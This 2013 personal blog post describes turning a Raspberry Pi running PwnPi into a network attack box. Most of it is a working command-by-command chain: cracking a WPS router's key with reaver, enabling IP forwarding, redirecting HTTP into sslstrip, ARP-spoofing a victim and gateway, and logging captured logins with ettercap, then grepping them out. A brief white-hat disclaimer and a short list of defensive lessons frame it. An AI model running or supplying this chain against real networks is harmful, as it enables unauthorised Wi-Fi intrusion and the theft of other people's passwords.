---
_edit_last: "1"
_syntaxhighlighter_encoded: "1"
Hide OgTags: "0"
Hide SexyBookmarks: "0"
author: thomasf
categories:
  - networking
date: "2013-01-27T12:43:24+00:00"
dsq_thread_id: "5136290356"
guid: https://blog.wapnet.nl/?p=1008
parent_post_id: null
post_id: "1008"
title: 'My Raspberry Pi Project: Hack box'
url: /2013/01/my-raspberry-pi-project-hack-box/

---
Finally I found a nice project for my Raspberry PI :) I'll write down some notes in this post to make it easier to find back some linux commands. Please use this documentation only as a white hat hacker and for learning purposes only!!!!

First:

- Have a compatible USB wireless dongle (list @ [pwnpi.net](http://www.pwnpi.net) )
- Download PwnPI @ [pwnpi.net](http://www.pwnpi.net)
- Download win32diskimager @ [http://sourceforge.net/projects/win32diskimager/](http://sourceforge.net/projects/win32diskimager/)
- Write the image to a SD card
- Boot up your PI (with a network cable)
- Scan the network (I use [netscan.exe](http://tools.global-e.nl/netscan.exe))
- Connect with [putty](http://tools.global-e.nl/putty.exe) to your device

To break in a WPS compatible wireless access point:

- airmon-ng start wlan0
- [![wireless-overview](/wp-content/uploads/2013/01/wireless-overview.png)](/wp-content/uploads/2013/01/wireless-overview.png)
- reaver -i mon0 -b 64:27:37:50:02:77 -c 5 -vv
- After +/- 10 hours you have the PSK

Now configure the wireless with your credentials

- airmon-ng stop wlan0
- nano /etc/network/interfaces
- Original file:


```
auto lo

iface lo inet loopback
iface eth0 inet dhcp

allow-hotplug wlan0
iface wlan0 inet manual
wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf
iface default inet dhcp
```


- New file:


```
auto lo

iface lo inet loopback
iface eth0 inet dhcp
iface wlan0 inet dhcp
wpa-ssid "L0g0ff"
wpa-psk "SomePassword"
allow-hotplug wlan0
iface wlan0 inet dhcp
#wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf
iface default inet dhcp
```


- Now bring up the wireless card: **ifup wlan0**

Now the wireless setup is done we make our PI an IP forwarding server. So that we can do man in the middle attacks.

- **nano /proc/sys/net/ipv4/ip\_forward** change the 0 to 1
- 
```
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 666
```


  (needed to forward all HTTP traffic to SSLStrip)
- **sslstrip -l 666**(do not close this terminal)

Now the proxy is running we want to ARP spoof so that we can redirect all traffic to our PI

- **arpspoof -i wlan0 -t 192.168.1.12 192.168.1.1**(where 1.12 is our victim and 1.1 our gateway) (do not close ths terminal)
- You can also spoof the entire network with **arpspoof -i wlan0 192.168.1.1**, but if your PI cannot handle all traffic you will DoS your network.

And now all things are set the sniffing can begin :)

- **ettercap -m ettercap.log -Tq -i wlan0**(don't close the terminal)

The only thing left now is wait that the victim is going to log in a website and the username and password will write in to the ettercap.log file. With the command **cat ettercap.log \|grep USER** you can see all the login credentials.

**What did we learn?**

1. Never login to a website without https
1. Never login to a website with https errors
1. Always disable WPS on your router
1. On company wireless sites always use a DMZ

Sources:
[http://www.ikwashetniet.blogspot.nl/2012/01/wps-van-handig-hulpmiddel-naar-gapend.html](http://www.ikwashetniet.blogspot.nl/2012/01/wps-van-handig-hulpmiddel-naar-gapend.html) [http://www.hackavision.com/2011/07/sniffing-passwords-over-wifi-connection.html](http://www.hackavision.com/2011/07/sniffing-passwords-over-wifi-connection.html)
